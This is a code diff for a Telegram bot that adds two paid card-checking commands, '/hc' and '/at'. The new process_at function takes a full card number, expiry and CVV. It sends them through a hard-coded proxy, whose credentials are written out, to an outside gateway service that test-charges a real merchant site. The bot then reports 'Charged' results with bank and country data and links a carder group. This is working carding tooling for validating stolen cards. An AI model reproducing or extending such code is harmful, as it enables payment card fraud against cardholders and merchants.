@@ -662,7 +662,13 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
             InlineKeyboardButton("💸 Shopify 0.98$", callback_data="shopify_gate"),
             InlineKeyboardButton("⚡ Auto Shopify", callback_data="autoshopify_gate")
         ],
-        [InlineKeyboardButton("💳 Stripe 1$", callback_data="stripe_gate")],
+        [
+            InlineKeyboardButton("💳 Stripe 1$", callback_data="stripe_gate"),
+            InlineKeyboardButton("💵 Shopify 10$", callback_data="shopify10_gate")
+        ],
+        [
+            InlineKeyboardButton("🏦 Authnet 36$", callback_data="authnet36_gate")
+        ],
         [InlineKeyboardButton("◀️ Back to Gate Menu", callback_data="gates_menu")]
     ])
     try:
@@ -680,6 +686,7 @@ async def charge_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_
             reply_markup=keyboard,
             disable_web_page_preview=True
         )
+
 
 async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Callback handler for the 'Shopify 5$' button."""
@@ -755,6 +762,78 @@ async def autoshopify_gate_handler(update: Update, context: ContextTypes.DEFAULT
             reply_markup=InlineKeyboardMarkup(keyboard),
             disable_web_page_preview=True
         )
+
+
+async def shopify10_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Callback handler for the 'Shopify 10$' button."""
+    q = update.callback_query
+    await q.answer()
+    text = (
+        "✦━━━━━━━━━━━━━━✦\n"
+        "      💵 <b>Shopify 10$</b>\n"
+        "✦━━━━━━━━━━━━━━✦\n\n"
+        "• <code>/hc</code> - <i>Check a single card on Shopify $10</i>\n"
+        "  Example:\n"
+        "  <code>/hc 1234567890123456|12|2026|123</code>\n\n"
+        "⚡ Use carefully, each check deducts credits.\n\n"
+        "✨ <b>Status</b> - <i>Active</i> ✅"
+    )
+    keyboard = [
+        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
+        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
+    ]
+    try:
+        # Correctly use edit_message_caption
+        await q.edit_message_caption(
+            caption=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    except Exception as e:
+        logger.warning(f"Failed to edit message, sending a new one: {e}")
+        await q.message.reply_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            disable_web_page_preview=True
+        )
+
+
+async def authnet36_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Callback handler for the 'Authnet 36$' button."""
+    q = update.callback_query
+    await q.answer()
+    text = (
+        "✦━━━━━━━━━━━━━━✦\n"
+        "      🏦 <b>Authnet 36$</b>\n"
+        "✦━━━━━━━━━━━━━━✦\n\n"
+        "• <code>/at</code> - <i>Check a single card on Authnet $36</i>\n"
+        "  Example:\n"
+        "  <code>/at 1234567890123456|12|2026|123</code>\n\n"
+        "⚡ Use carefully, each check deducts credits.\n\n"
+        "✨ <b>Status</b> - <i>Active</i> ✅"
+    )
+    keyboard = [
+        [InlineKeyboardButton("◀️ Back to Charge Menu", callback_data="charge_sub_menu")],
+        [InlineKeyboardButton("◀️ Back to Main Menu", callback_data="back_to_start")]
+    ]
+    try:
+        # Correctly use edit_message_caption
+        await q.edit_message_caption(
+            caption=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    except Exception as e:
+        logger.warning(f"Failed to edit message, sending a new one: {e}")
+        await q.message.reply_text(
+            text=text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            disable_web_page_preview=True
+        )
+
+
 
 async def stripe_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Callback handler for the 'Stripe 1$' button."""
@@ -845,10 +924,12 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "shopify_gate": shopify_gate_handler,
         "autoshopify_gate": autoshopify_gate_handler,
         "stripe_gate": stripe_gate_handler,
+        "shopify10_gate": shopify10_gate_handler,   # NEW
+        "authnet36_gate": authnet36_gate_handler,   # NEW
         "stripe_examples": stripe_examples_handler,
         "braintree_examples": braintree_examples_handler,
         "ds_lookup": ds_lookup_menu_handler,
-        "back_to_start": back_to_start_handler
+        "back_to_start": back_to_start_handler,
     }
 
     handler = handlers.get(data)
@@ -856,6 +937,7 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await handler(update, context)
     else:
         await q.answer("⚠️ Unknown option selected.", show_alert=True)
+
 
 
 
@@ -2965,7 +3047,232 @@ async def hc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     asyncio.create_task(process_hc(update, context, payload))
 
 
+import aiohttp
+import json
+import logging
+import asyncio
+from datetime import datetime
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import ContextTypes
 
+# Import DB helpers
+from db import get_user, update_user
+
+logger = logging.getLogger(__name__)
+
+# --- User cooldowns ---
+user_cooldowns = {}
+
+async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
+    """Prevent spam by enforcing a cooldown per user."""
+    last_run = user_cooldowns.get(user_id, 0)
+    now = datetime.now().timestamp()
+    if now - last_run < cooldown_seconds:
+        await update.effective_message.reply_text(
+            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
+        )
+        return False
+    user_cooldowns[user_id] = now
+    return True
+
+async def consume_credit(user_id: int) -> bool:
+    """Consume 1 credit from DB user if available."""
+    user_data = await get_user(user_id)
+    if user_data and user_data.get("credits", 0) > 0:
+        new_credits = user_data["credits"] - 1
+        await update_user(user_id, credits=new_credits)
+        return True
+    return False
+
+
+
+# --- Shopify Processor ---
+import asyncio
+import aiohttp
+import json
+import logging
+from html import escape
+from telegram import Update
+from telegram.ext import ContextTypes
+from telegram.constants import ParseMode
+import re
+
+logger = logging.getLogger(__name__)
+
+# --- HC Processor ---
+async def process_at(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
+    """
+    Process a /at command: check AuthNet card, display response and BIN info.
+    """
+
+    try:
+        user = update.effective_user
+
+        # --- Consume credit ---
+        if not await consume_credit(user.id):
+            await update.message.reply_text("❌ You don’t have enough credits left.")
+            return
+
+        # --- Extract card details ---
+        parts = payload.split("|")
+        if len(parts) != 4:
+            await update.message.reply_text(
+                "❌ Invalid format.\nUse: `/at 1234567812345678|12|2028|123`",
+                parse_mode=ParseMode.MARKDOWN_V2
+            )
+            return
+
+        cc, mm, yy, cvv = [p.strip() for p in parts]
+        full_card = f"{cc}|{mm}|{yy}|{cvv}"
+
+        # --- Clickable bullet ---
+        BULLET_GROUP_LINK = "https://t.me/CARDER33"
+        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
+
+        # --- Initial processing message ---
+        processing_text = (
+            f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
+            f"<pre><code>{full_card}</code></pre>\n\n"
+            f"{bullet_link} <b>Gateway ➵ 𝐀𝐮𝐭𝐡𝐍𝐞𝐭 𝐂𝐡𝐚𝐫𝐠𝐞</b>\n"
+            f"{bullet_link} <b>Status ➵ Checking 🔎...</b>"
+        )
+
+        processing_msg = await update.message.reply_text(
+            processing_text,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+        # --- API request ---
+        api_url = (
+            f"https://auto-authnet-gateway.onrender.com/index.php"
+            f"?site=https://trimleaf.ca"
+            f"&cc={full_card}"
+            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        )
+
+        async with aiohttp.ClientSession() as session:
+            async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
+                api_response = await resp.text()
+
+        # --- Parse API response ---
+        try:
+            data = json.loads(api_response)
+        except json.JSONDecodeError:
+            logger.error(f"API returned invalid JSON: {api_response[:300]}")
+            await processing_msg.edit_text(
+                f"❌ Invalid API response:\n<code>{escape(api_response[:500])}</code>",
+                parse_mode=ParseMode.HTML
+            )
+            return
+
+        response = data.get("Response", "Unknown")
+        gateway = data.get("Gateway", "AuthNet")
+        price = data.get("Price", "36$")
+
+        # --- BIN lookup ---
+        try:
+            bin_number = cc[:6]
+            bin_details = await get_bin_info(bin_number)
+            brand = (bin_details.get("scheme") or "N/A").title()
+            issuer = bin_details.get("bank") or "N/A"
+            country_name = bin_details.get("country") or "Unknown"
+            country_flag = bin_details.get("country_emoji", "")
+        except Exception as e:
+            logger.warning(f"BIN lookup failed for {bin_number}: {e}")
+            brand = issuer = "N/A"
+            country_name = "Unknown"
+            country_flag = ""
+
+        # --- Requester ---
+        full_name = " ".join(filter(None, [user.first_name, user.last_name]))
+        requester = f'<a href="tg://user?id={user.id}">{escape(full_name)}</a>'
+
+        # --- Developer Branding ---
+        DEVELOPER_NAME = "kคli liຖนxx"
+        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
+        developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
+
+        # --- Enhance response with emojis ---
+        display_response = escape(response)
+        if re.search(r"\b(Thank You|approved|charged|success)\b", response, re.I):
+            display_response = f"{escape(response)} ▸𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
+        elif "3D_AUTHENTICATION" in response.upper():
+            display_response = f"{escape(response)} 🔒"
+        elif "CARD_DECLINED" in response.upper():
+            display_response = f"{escape(response)} ❌"
+
+        # --- Final formatted message ---
+        final_msg = (
+            f"◇━━〔 <b>𝑨𝒖𝒕𝒉𝑵𝒆𝒕</b> 〕━━◇\n"
+            f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
+            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑨𝒖𝒕𝒉𝑵𝒆𝒕 𝟑𝟔$\n"
+            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
+            "――――――――――――――――\n"
+            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
+            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➵ <code>{escape(issuer)}</code>\n"
+            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ <code>{escape(country_name)} {country_flag}</code>\n"
+            "――――――――――――――――\n"
+            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester}\n"
+            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}\n"
+            "――――――――――――――――"
+        )
+
+        await processing_msg.edit_text(
+            final_msg,
+            parse_mode=ParseMode.HTML,
+            disable_web_page_preview=True
+        )
+
+    except Exception as e:
+        logger.exception("Error in processing /at")
+        try:
+            await update.message.reply_text(
+                f"❌ Error: <code>{escape(str(e))}</code>",
+                parse_mode=ParseMode.HTML
+            )
+        except Exception:
+            pass
+
+
+
+# --- Main /sh command ---
+import re
+
+# Assuming you have this regex pattern somewhere globally:
+CARD_REGEX = re.compile(r"\d{12,19}\|\d{2}\|\d{2,4}\|\d{3,4}")
+
+async def at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+
+    # --- Cooldown check ---
+    if not await enforce_cooldown(user.id, update):
+        return
+
+    payload = None
+
+    # --- Check arguments ---
+    if context.args:
+        payload = " ".join(context.args).strip()
+
+    # --- If no args, check reply message ---
+    elif update.message.reply_to_message and update.message.reply_to_message.text:
+        match = CARD_REGEX.search(update.message.reply_to_message.text)
+        if match:
+            payload = match.group().strip()
+
+    # --- If still no payload ---
+    if not payload:
+        await update.message.reply_text(
+            "⚠️ Usage: <code>/at card|mm|yy|cvv</code>\n"
+            "Or reply to a message containing a card.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    # --- Run in background ---
+    asyncio.create_task(process_at(update, context, payload))
 
 
 
@@ -6003,6 +6310,7 @@ def register_force_join(application):
     application.add_handler(CommandHandler("mass", force_join(mass_handler)))
     application.add_handler(CommandHandler("sh", force_join(sh_command)))
     application.add_handler(CommandHandler("hc", force_join(hc_command)))
+    application.add_handler(CommandHandler("at", force_join(at_command)))
     application.add_handler(CommandHandler("seturl", force_join(seturl)))
     application.add_handler(CommandHandler("mysites", force_join(mysites)))
     application.add_handler(CommandHandler("msp", force_join(msp)))
@@ -6019,7 +6327,7 @@ def register_force_join(application):
     application.add_handler(CommandHandler("fk", force_join(fk_command)))
     application.add_handler(CommandHandler("vbv", force_join(vbv)))
     application.add_handler(CommandHandler("b3", force_join(b3)))
-    application.add_handler(CommandHandler("gate", gate_command))
+    application.add_handler(CommandHandler("gate", force_join(gate_command)))
     application.add_handler(CommandHandler("fl", force_join(fl_command)))
     application.add_handler(CommandHandler("status", force_join(status_command)))
     application.add_handler(CommandHandler("redeem", force_join(redeem_command)))
